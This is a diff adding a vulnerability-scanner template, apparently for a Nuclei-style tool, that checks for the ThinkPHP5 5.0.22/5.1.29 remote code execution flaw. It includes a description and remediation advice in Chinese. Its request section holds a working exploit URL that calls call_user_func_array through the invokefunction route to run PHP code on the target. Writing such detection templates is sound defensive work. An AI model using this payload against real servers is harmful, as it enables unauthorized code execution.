@@ -1,0 +1,25 @@
+id: thinkphp5-rce-invokefunction
+info:
+  name: ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞
+  author:
+  - 折跃
+  description: |-
+    ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞
+    ThinkPHP是一款运用极广的PHP开发框架。其版本5中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。
+  severity: critical
+  remediation: |-
+    #### 官方修复方案：
+    升级系统至无漏洞版本，或于官网下载安全补丁。
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code == 200
+    - contains(body,verify)
+    - '!contains(body,"print_r({{verify}})")'
+  raw:
+  - |
+    GET /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=print_r&vars[1][]={{verify}} HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: text/xml
